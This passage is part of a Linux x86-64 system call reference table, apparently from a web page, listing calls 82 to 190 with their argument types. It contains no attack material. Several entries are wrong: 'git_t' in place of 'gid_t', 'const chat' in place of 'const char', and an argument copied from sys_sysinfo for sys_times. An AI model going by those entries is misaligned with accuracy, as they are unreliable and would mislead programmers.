| <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | | | | |\n| <font style=\"color:#4f4f4f;\">83.</font> | <font style=\"color:#4f4f4f;\">sys_mkdir</font> | <font style=\"color:#4f4f4f;\">83.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | | |\n| <font style=\"color:#4f4f4f;\">84.</font> | <font style=\"color:#4f4f4f;\">sys_rmdir</font> | <font style=\"color:#4f4f4f;\">84.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">85.</font> | <font style=\"color:#4f4f4f;\">sys_creat</font> | <font style=\"color:#4f4f4f;\">85.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">int mode</font> | | | | |\n| <font style=\"color:#4f4f4f;\">86.</font> | <font style=\"color:#4f4f4f;\">sys_link</font> | <font style=\"color:#4f4f4f;\">86.</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | | | | |\n| <font style=\"color:#4f4f4f;\">87.</font> | <font style=\"color:#4f4f4f;\">sys_unlink</font> | <font style=\"color:#4f4f4f;\">87.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">88.</font> | <font style=\"color:#4f4f4f;\">sys_symlink</font> | <font style=\"color:#4f4f4f;\">88.</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | | | | |\n| <font style=\"color:#4f4f4f;\">89.</font> | <font style=\"color:#4f4f4f;\">sys_readlink</font> | <font style=\"color:#4f4f4f;\">89.</font> | <font style=\"color:#4f4f4f;\">const char *path</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int bufsiz</font> | | | |\n| <font style=\"color:#4f4f4f;\">90.</font> | <font style=\"color:#4f4f4f;\">sys_chmod</font> | <font style=\"color:#4f4f4f;\">90.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">mode_t mode</font> | | | | |\n| <font style=\"color:#4f4f4f;\">91.</font> | <font style=\"color:#4f4f4f;\">sys_fchmod</font> | <font style=\"color:#4f4f4f;\">91.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">mode_t mode</font> | | | | |\n| <font style=\"color:#4f4f4f;\">92.</font> | <font style=\"color:#4f4f4f;\">sys_chown</font> | <font style=\"color:#4f4f4f;\">92.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">git_t group</font> | | | |\n| <font style=\"color:#4f4f4f;\">93.</font> | <font style=\"color:#4f4f4f;\">sys_fchown</font> | <font style=\"color:#4f4f4f;\">93.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">git_t group</font> | | | |\n| <font style=\"color:#4f4f4f;\">94.</font> | <font style=\"color:#4f4f4f;\">sys_lchown</font> | <font style=\"color:#4f4f4f;\">94.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">uid_t user</font> | <font style=\"color:#4f4f4f;\">git_t group</font> | | | |\n| <font style=\"color:#4f4f4f;\">95.</font> | <font style=\"color:#4f4f4f;\">sys_umask</font> | <font style=\"color:#4f4f4f;\">95.</font> | <font style=\"color:#4f4f4f;\">int mask</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">96.</font> | <font style=\"color:#4f4f4f;\">sys_gettimeofday</font> | <font style=\"color:#4f4f4f;\">96.</font> | <font style=\"color:#4f4f4f;\">struct timeval *tv</font> | <font style=\"color:#4f4f4f;\">struct timezone *tz</font> | | | | |\n| <font style=\"color:#4f4f4f;\">97.</font> | <font style=\"color:#4f4f4f;\">sys_getrlimit</font> | <font style=\"color:#4f4f4f;\">97.</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">struct rlimit *rlim</font> | | | | |\n| <font style=\"color:#4f4f4f;\">98.</font> | <font style=\"color:#4f4f4f;\">sys_getrusage</font> | <font style=\"color:#4f4f4f;\">98.</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">struct rusage *ru</font> | | | | |\n| <font style=\"color:#4f4f4f;\">99.</font> | <font style=\"color:#4f4f4f;\">sys_sysinfo</font> | <font style=\"color:#4f4f4f;\">99.</font> | <font style=\"color:#4f4f4f;\">struct sysinfo *info</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">100.</font> | <font style=\"color:#4f4f4f;\">sys_times</font> | <font style=\"color:#4f4f4f;\">100.</font> | <font style=\"color:#4f4f4f;\">struct sysinfo *info</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">101.</font> | <font style=\"color:#4f4f4f;\">sys_ptrace</font> | <font style=\"color:#4f4f4f;\">101.</font> | <font style=\"color:#4f4f4f;\">long request</font> | <font style=\"color:#4f4f4f;\">long pid</font> | <font style=\"color:#4f4f4f;\">unsigned long addr</font> | <font style=\"color:#4f4f4f;\">unsigned long data</font> | | |\n| <font style=\"color:#4f4f4f;\">102.</font> | <font style=\"color:#4f4f4f;\">sys_getuid</font> | <font style=\"color:#4f4f4f;\">102.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">103.</font> | <font style=\"color:#4f4f4f;\">sys_syslog</font> | <font style=\"color:#4f4f4f;\">103.</font> | <font style=\"color:#4f4f4f;\">int type</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">int len</font> | | | |\n| <font style=\"color:#4f4f4f;\">104.</font> | <font style=\"color:#4f4f4f;\">sys_getgid</font> | <font style=\"color:#4f4f4f;\">104.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">105.</font> | <font style=\"color:#4f4f4f;\">sys_setuid</font> | <font style=\"color:#4f4f4f;\">105.</font> | <font style=\"color:#4f4f4f;\">uid_t uid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">106.</font> | <font style=\"color:#4f4f4f;\">sys_setgid</font> | <font style=\"color:#4f4f4f;\">106.</font> | <font style=\"color:#4f4f4f;\">git_t gid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">107.</font> | <font style=\"color:#4f4f4f;\">sys_geteuid</font> | <font style=\"color:#4f4f4f;\">107.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">108.</font> | <font style=\"color:#4f4f4f;\">sys_getegid</font> | <font style=\"color:#4f4f4f;\">108.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">109.</font> | <font style=\"color:#4f4f4f;\">sys_setpgid</font> | <font style=\"color:#4f4f4f;\">109.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">pid_t pgid</font> | | | | |\n| <font style=\"color:#4f4f4f;\">110.</font> | <font style=\"color:#4f4f4f;\">sys_getppid</font> | <font style=\"color:#4f4f4f;\">110.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">111.</font> | <font style=\"color:#4f4f4f;\">sys_getpgrp</font> | <font style=\"color:#4f4f4f;\">111.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">112.</font> | <font style=\"color:#4f4f4f;\">sys_setsid</font> | <font style=\"color:#4f4f4f;\">112.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">113.</font> | <font style=\"color:#4f4f4f;\">sys_setreuid</font> | <font style=\"color:#4f4f4f;\">113.</font> | <font style=\"color:#4f4f4f;\">uid_t ruid</font> | <font style=\"color:#4f4f4f;\">uid_t euid</font> | | | | |\n| <font style=\"color:#4f4f4f;\">114.</font> | <font style=\"color:#4f4f4f;\">sys_setregid</font> | <font style=\"color:#4f4f4f;\">114.</font> | <font style=\"color:#4f4f4f;\">git_t rgid</font> | <font style=\"color:#4f4f4f;\">gid_t egid</font> | | | | |\n| <font style=\"color:#4f4f4f;\">115.</font> | <font style=\"color:#4f4f4f;\">sys_getgroups</font> | <font style=\"color:#4f4f4f;\">115.</font> | <font style=\"color:#4f4f4f;\">int gidsetsize</font> | <font style=\"color:#4f4f4f;\">gid_t *grouplist</font> | | | | |\n| <font style=\"color:#4f4f4f;\">116.</font> | <font style=\"color:#4f4f4f;\">sys_setgroups</font> | <font style=\"color:#4f4f4f;\">116.</font> | <font style=\"color:#4f4f4f;\">int gidsetsize</font> | <font style=\"color:#4f4f4f;\">gid_t *grouplist</font> | | | | |\n| <font style=\"color:#4f4f4f;\">117.</font> | <font style=\"color:#4f4f4f;\">sys_setresuid</font> | <font style=\"color:#4f4f4f;\">117.</font> | <font style=\"color:#4f4f4f;\">uid_t *ruid</font> | <font style=\"color:#4f4f4f;\">uid_t *euid</font> | <font style=\"color:#4f4f4f;\">uid_t *suid</font> | | | |\n| <font style=\"color:#4f4f4f;\">118.</font> | <font style=\"color:#4f4f4f;\">sys_getresuid</font> | <font style=\"color:#4f4f4f;\">118.</font> | <font style=\"color:#4f4f4f;\">uid_t *ruid</font> | <font style=\"color:#4f4f4f;\">uid_t *euid</font> | <font style=\"color:#4f4f4f;\">uid_t *suid</font> | | | |\n| <font style=\"color:#4f4f4f;\">119.</font> | <font style=\"color:#4f4f4f;\">sys_setresgid</font> | <font style=\"color:#4f4f4f;\">119.</font> | <font style=\"color:#4f4f4f;\">gid_t rgid</font> | <font style=\"color:#4f4f4f;\">gid_t egid</font> | <font style=\"color:#4f4f4f;\">gid_t sgid</font> | | | |\n| <font style=\"color:#4f4f4f;\">120.</font> | <font style=\"color:#4f4f4f;\">sys_getresgid</font> | <font style=\"color:#4f4f4f;\">120.</font> | <font style=\"color:#4f4f4f;\">git_t *rgid</font> | <font style=\"color:#4f4f4f;\">git_t *egid</font> | <font style=\"color:#4f4f4f;\">git_t *sgid</font> | | | |\n| <font style=\"color:#4f4f4f;\">121.</font> | <font style=\"color:#4f4f4f;\">sys_getpgid</font> | <font style=\"color:#4f4f4f;\">121.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">122.</font> | <font style=\"color:#4f4f4f;\">sys_setfsuid</font> | <font style=\"color:#4f4f4f;\">122.</font> | <font style=\"color:#4f4f4f;\">uid_t uid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">123.</font> | <font style=\"color:#4f4f4f;\">sys_setfsgid</font> | <font style=\"color:#4f4f4f;\">123.</font> | <font style=\"color:#4f4f4f;\">gid_t gid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">124.</font> | <font style=\"color:#4f4f4f;\">sys_getsid</font> | <font style=\"color:#4f4f4f;\">124.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">125.</font> | <font style=\"color:#4f4f4f;\">sys_capget</font> | <font style=\"color:#4f4f4f;\">125.</font> | <font style=\"color:#4f4f4f;\">cap_user_header_t header</font> | <font style=\"color:#4f4f4f;\">cap_user_data_t dataptr</font> | | | | |\n| <font style=\"color:#4f4f4f;\">126.</font> | <font style=\"color:#4f4f4f;\">sys_capset</font> | <font style=\"color:#4f4f4f;\">126.</font> | <font style=\"color:#4f4f4f;\">cap_user_header_t header</font> | <font style=\"color:#4f4f4f;\">const cap_user_data_t data</font> | | | | |\n| <font style=\"color:#4f4f4f;\">127.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigpending</font> | <font style=\"color:#4f4f4f;\">127.</font> | <font style=\"color:#4f4f4f;\">sigset_t *set</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | | | | |\n| <font style=\"color:#4f4f4f;\">128.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigtimedwait</font> | <font style=\"color:#4f4f4f;\">128.</font> | <font style=\"color:#4f4f4f;\">const sigset_t *uthese</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | <font style=\"color:#4f4f4f;\">const struct timespec *uts</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | | |\n| <font style=\"color:#4f4f4f;\">129.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigqueueinfo</font> | <font style=\"color:#4f4f4f;\">129.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | | | |\n| <font style=\"color:#4f4f4f;\">130.</font> | <font style=\"color:#4f4f4f;\">sys_rt_sigsuspend</font> | <font style=\"color:#4f4f4f;\">130.</font> | <font style=\"color:#4f4f4f;\">sigset_t *unewset</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> | | | | |\n| <font style=\"color:#4f4f4f;\">131.</font> | <font style=\"color:#4f4f4f;\">sys_sigaltstack</font> | <font style=\"color:#4f4f4f;\">131.</font> | <font style=\"color:#4f4f4f;\">const stack_t *uss</font> | <font style=\"color:#4f4f4f;\">stack_t *uoss</font> | | | | |\n| <font style=\"color:#4f4f4f;\">132.</font> | <font style=\"color:#4f4f4f;\">sys_utime</font> | <font style=\"color:#4f4f4f;\">132.</font> | <font style=\"color:#4f4f4f;\">char *filename</font> | <font style=\"color:#4f4f4f;\">struct utimbuf *times</font> | | | | |\n| <font style=\"color:#4f4f4f;\">133.</font> | <font style=\"color:#4f4f4f;\">sys_mknod</font> | <font style=\"color:#4f4f4f;\">133.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | | | |\n| <font style=\"color:#4f4f4f;\">134.</font> | <font style=\"color:#4f4f4f;\">sys_uselib</font> | <font style=\"color:#4f4f4f;\">134.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">135.</font> | <font style=\"color:#4f4f4f;\">sys_personality</font> | <font style=\"color:#4f4f4f;\">135.</font> | <font style=\"color:#4f4f4f;\">unsigned int personality</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">136.</font> | <font style=\"color:#4f4f4f;\">sys_ustat</font> | <font style=\"color:#4f4f4f;\">136.</font> | <font style=\"color:#4f4f4f;\">unsigned dev</font> | <font style=\"color:#4f4f4f;\">struct ustat *ubuf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">137.</font> | <font style=\"color:#4f4f4f;\">sys_statfs</font> | <font style=\"color:#4f4f4f;\">137.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">struct statfs *buf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">138.</font> | <font style=\"color:#4f4f4f;\">sys_fstatfs</font> | <font style=\"color:#4f4f4f;\">138.</font> | <font style=\"color:#4f4f4f;\">unsigned int fd</font> | <font style=\"color:#4f4f4f;\">struct statfs *buf</font> | | | | |\n| <font style=\"color:#4f4f4f;\">139.</font> | <font style=\"color:#4f4f4f;\">sys_sysfs</font> | <font style=\"color:#4f4f4f;\">139.</font> | <font style=\"color:#4f4f4f;\">int option</font> | <font style=\"color:#4f4f4f;\">unsigned long arg1</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | | | |\n| <font style=\"color:#4f4f4f;\">140.</font> | <font style=\"color:#4f4f4f;\">sys_getpriority</font> | <font style=\"color:#4f4f4f;\">140.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | | | | |\n| <font style=\"color:#4f4f4f;\">141.</font> | <font style=\"color:#4f4f4f;\">sys_setpriority</font> | <font style=\"color:#4f4f4f;\">141.</font> | <font style=\"color:#4f4f4f;\">int which</font> | <font style=\"color:#4f4f4f;\">int who</font> | <font style=\"color:#4f4f4f;\">int niceval</font> | | | |\n| <font style=\"color:#4f4f4f;\">142.</font> | <font style=\"color:#4f4f4f;\">sys_sched_setparam</font> | <font style=\"color:#4f4f4f;\">142.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | | | | |\n| <font style=\"color:#4f4f4f;\">143.</font> | <font style=\"color:#4f4f4f;\">sys_sched_getparam</font> | <font style=\"color:#4f4f4f;\">143.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | | | | |\n| <font style=\"color:#4f4f4f;\">144.</font> | <font style=\"color:#4f4f4f;\">sys_sched_setscheduler</font> | <font style=\"color:#4f4f4f;\">144.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int policy</font> | <font style=\"color:#4f4f4f;\">struct sched_param *param</font> | | | |\n| <font style=\"color:#4f4f4f;\">145.</font> | <font style=\"color:#4f4f4f;\">sys_sched_getscheduler</font> | <font style=\"color:#4f4f4f;\">145.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">146.</font> | <font style=\"color:#4f4f4f;\">sys_sched_get_priority_max</font> | <font style=\"color:#4f4f4f;\">146.</font> | <font style=\"color:#4f4f4f;\">int policy</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">147.</font> | <font style=\"color:#4f4f4f;\">sys_sched_get_priority_min</font> | <font style=\"color:#4f4f4f;\">147.</font> | <font style=\"color:#4f4f4f;\">int policy</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">148.</font> | <font style=\"color:#4f4f4f;\">sys_sched_rr_get_interval</font> | <font style=\"color:#4f4f4f;\">148.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct timespec *interval</font> | | | | |\n| <font style=\"color:#4f4f4f;\">149.</font> | <font style=\"color:#4f4f4f;\">sys_mlock</font> | <font style=\"color:#4f4f4f;\">149.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">150.</font> | <font style=\"color:#4f4f4f;\">sys_munlock</font> | <font style=\"color:#4f4f4f;\">150.</font> | <font style=\"color:#4f4f4f;\">unsigned long start</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">151.</font> | <font style=\"color:#4f4f4f;\">sys_mlockall</font> | <font style=\"color:#4f4f4f;\">151.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">152.</font> | <font style=\"color:#4f4f4f;\">sys_munlockall</font> | <font style=\"color:#4f4f4f;\">152.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">153.</font> | <font style=\"color:#4f4f4f;\">sys_vhangup</font> | <font style=\"color:#4f4f4f;\">153.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">154.</font> | <font style=\"color:#4f4f4f;\">sys_modify_ldt</font> | <font style=\"color:#4f4f4f;\">154.</font> | <font style=\"color:#4f4f4f;\">int func</font> | <font style=\"color:#4f4f4f;\">void *ptr</font> | <font style=\"color:#4f4f4f;\">unsigned long bytecount</font> | | | |\n| <font style=\"color:#4f4f4f;\">155.</font> | <font style=\"color:#4f4f4f;\">sys_pivot_root</font> | <font style=\"color:#4f4f4f;\">155.</font> | <font style=\"color:#4f4f4f;\">const char *new_root</font> | <font style=\"color:#4f4f4f;\">const char *put_old</font> | | | | |\n| <font style=\"color:#4f4f4f;\">156.</font> | <font style=\"color:#4f4f4f;\">sys__sysctl</font> | <font style=\"color:#4f4f4f;\">156.</font> | <font style=\"color:#4f4f4f;\">struct __sysctl_args *args</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">157.</font> | <font style=\"color:#4f4f4f;\">sys_prctl</font> | <font style=\"color:#4f4f4f;\">157.</font> | <font style=\"color:#4f4f4f;\">int option</font> | <font style=\"color:#4f4f4f;\">unsigned long arg2</font> | <font style=\"color:#4f4f4f;\">unsigned long arg3</font> | <font style=\"color:#4f4f4f;\">unsigned long arg4</font> | <font style=\"color:#4f4f4f;\">unsigned long arg5</font> | |\n| <font style=\"color:#4f4f4f;\">158.</font> | <font style=\"color:#4f4f4f;\">sys_arch_prctl</font> | <font style=\"color:#4f4f4f;\">158.</font> | <font style=\"color:#4f4f4f;\">struct task_struct *task</font> | <font style=\"color:#4f4f4f;\">int code</font> | <font style=\"color:#4f4f4f;\">unsigned long *addr</font> | | | |\n| <font style=\"color:#4f4f4f;\">159.</font> | <font style=\"color:#4f4f4f;\">sys_adjtimex</font> | <font style=\"color:#4f4f4f;\">159.</font> | <font style=\"color:#4f4f4f;\">struct timex *txc_p</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">160.</font> | <font style=\"color:#4f4f4f;\">sys_setrlimit</font> | <font style=\"color:#4f4f4f;\">160.</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">struct rlimit *rlim</font> | | | | |\n| <font style=\"color:#4f4f4f;\">161.</font> | <font style=\"color:#4f4f4f;\">sys_chroot</font> | <font style=\"color:#4f4f4f;\">161.</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">162.</font> | <font style=\"color:#4f4f4f;\">sys_sync</font> | <font style=\"color:#4f4f4f;\">162.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">163.</font> | <font style=\"color:#4f4f4f;\">sys_acct</font> | <font style=\"color:#4f4f4f;\">163.</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">164.</font> | <font style=\"color:#4f4f4f;\">sys_settimeofday</font> | <font style=\"color:#4f4f4f;\">164.</font> | <font style=\"color:#4f4f4f;\">struct timeval *tv</font> | <font style=\"color:#4f4f4f;\">struct timezone *tz</font> | | | | |\n| <font style=\"color:#4f4f4f;\">165.</font> | <font style=\"color:#4f4f4f;\">sys_mount</font> | <font style=\"color:#4f4f4f;\">165.</font> | <font style=\"color:#4f4f4f;\">char *dev_name</font> | <font style=\"color:#4f4f4f;\">char *dir_name</font> | <font style=\"color:#4f4f4f;\">char *type</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">void *data</font> | |\n| <font style=\"color:#4f4f4f;\">166.</font> | <font style=\"color:#4f4f4f;\">sys_umount2</font> | <font style=\"color:#4f4f4f;\">166.</font> | <font style=\"color:#4f4f4f;\">const char *target</font> | <font style=\"color:#4f4f4f;\">int flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">167.</font> | <font style=\"color:#4f4f4f;\">sys_swapon</font> | <font style=\"color:#4f4f4f;\">167.</font> | <font style=\"color:#4f4f4f;\">const char *specialfile</font> | <font style=\"color:#4f4f4f;\">int swap_flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">168.</font> | <font style=\"color:#4f4f4f;\">sys_swapoff</font> | <font style=\"color:#4f4f4f;\">168.</font> | <font style=\"color:#4f4f4f;\">const char *specialfile</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">169.</font> | <font style=\"color:#4f4f4f;\">sys_reboot</font> | <font style=\"color:#4f4f4f;\">169.</font> | <font style=\"color:#4f4f4f;\">int magic1</font> | <font style=\"color:#4f4f4f;\">int magic2</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">void *arg</font> | | |\n| <font style=\"color:#4f4f4f;\">170.</font> | <font style=\"color:#4f4f4f;\">sys_sethostname</font> | <font style=\"color:#4f4f4f;\">170.</font> | <font style=\"color:#4f4f4f;\">char *name</font> | <font style=\"color:#4f4f4f;\">int len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">171.</font> | <font style=\"color:#4f4f4f;\">sys_setdomainname</font> | <font style=\"color:#4f4f4f;\">171.</font> | <font style=\"color:#4f4f4f;\">char *name</font> | <font style=\"color:#4f4f4f;\">int len</font> | | | | |\n| <font style=\"color:#4f4f4f;\">172.</font> | <font style=\"color:#4f4f4f;\">sys_iopl</font> | <font style=\"color:#4f4f4f;\">172.</font> | <font style=\"color:#4f4f4f;\">unsigned int level</font> | <font style=\"color:#4f4f4f;\">struct pt_regs *regs</font> | | | | |\n| <font style=\"color:#4f4f4f;\">173.</font> | <font style=\"color:#4f4f4f;\">sys_ioperm</font> | <font style=\"color:#4f4f4f;\">173.</font> | <font style=\"color:#4f4f4f;\">unsigned long from</font> | <font style=\"color:#4f4f4f;\">unsigned long num</font> | <font style=\"color:#4f4f4f;\">int turn_on</font> | | | |\n| <font style=\"color:#4f4f4f;\">174.</font> | <font style=\"color:#4f4f4f;\">sys_create_module</font> | <font style=\"color:#4f4f4f;\">174.</font> | <font style=\"color:#4f4f4f;\">REMOVED IN Linux 2.6</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">175.</font> | <font style=\"color:#4f4f4f;\">sys_init_module</font> | <font style=\"color:#4f4f4f;\">175.</font> | <font style=\"color:#4f4f4f;\">void *umod</font> | <font style=\"color:#4f4f4f;\">unsigned long len</font> | <font style=\"color:#4f4f4f;\">const char *uargs</font> | | | |\n| <font style=\"color:#4f4f4f;\">176.</font> | <font style=\"color:#4f4f4f;\">sys_delete_module</font> | <font style=\"color:#4f4f4f;\">176.</font> | <font style=\"color:#4f4f4f;\">const chat *name_user</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | | | | |\n| <font style=\"color:#4f4f4f;\">177.</font> | <font style=\"color:#4f4f4f;\">sys_get_kernel_syms</font> | <font style=\"color:#4f4f4f;\">177.</font> | <font style=\"color:#4f4f4f;\">REMOVED IN Linux 2.6</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">178.</font> | <font style=\"color:#4f4f4f;\">sys_query_module</font> | <font style=\"color:#4f4f4f;\">178.</font> | <font style=\"color:#4f4f4f;\">REMOVED IN Linux 2.6</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">179.</font> | <font style=\"color:#4f4f4f;\">sys_quotactl</font> | <font style=\"color:#4f4f4f;\">179.</font> | <font style=\"color:#4f4f4f;\">unsigned int cmd</font> | <font style=\"color:#4f4f4f;\">const char *special</font> | <font style=\"color:#4f4f4f;\">qid_t id</font> | <font style=\"color:#4f4f4f;\">void *addr</font> | | |\n| <font style=\"color:#4f4f4f;\">180.</font> | <font style=\"color:#4f4f4f;\">sys_nfsservctl</font> | <font style=\"color:#4f4f4f;\">180.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">181.</font> | <font style=\"color:#4f4f4f;\">sys_getpmsg</font> | <font style=\"color:#4f4f4f;\">181.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">182.</font> | <font style=\"color:#4f4f4f;\">sys_putpmsg</font> | <font style=\"color:#4f4f4f;\">182.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">183.</font> | <font style=\"color:#4f4f4f;\">sys_afs_syscall</font> | <font style=\"color:#4f4f4f;\">183.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">184.</font> | <font style=\"color:#4f4f4f;\">sys_tuxcall</font> | <font style=\"color:#4f4f4f;\">184.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">185.</font> | <font style=\"color:#4f4f4f;\">sys_security</font> | <font style=\"color:#4f4f4f;\">185.</font> | <font style=\"color:#4f4f4f;\">NOT IMPLEMENTED</font> | | | | | |\n| <font style=\"color:#4f4f4f;\">186.</font> | <font style=\"color:#4f4f4f;\">sys_gettid</font> | <font style=\"color:#4f4f4f;\">186.</font> | | | | | | |\n| <font style=\"color:#4f4f4f;\">187.</font> | <font style=\"color:#4f4f4f;\">sys_readahead</font> | <font style=\"color:#4f4f4f;\">187.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | | | |\n| <font style=\"color:#4f4f4f;\">188.</font> | <font style=\"color:#4f4f4f;\">sys_setxattr</font> | <font style=\"color:#4f4f4f;\">188.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | |\n| <font style=\"color:#4f4f4f;\">189.</font> | <font style=\"color:#4f4f4f;\">sys_lsetxattr</font> | <font style=\"color:#4f4f4f;\">189.</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | |\n| <font style=\"color:#4f4f4f;\">190.</font> | <font style=\"color:#4f4f4f;\">sys_fsetxattr</font> | <font style=\"color:#4f4f4f;\">190.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">const void *value</font> | <font style=\"color:#4f4f4f;\">size_t size</font> | <font style=\"color:#4f4f4f;\">int flags</font> | |\n| <font style=\"color:#4f4f4f;\">191.</font> | <font 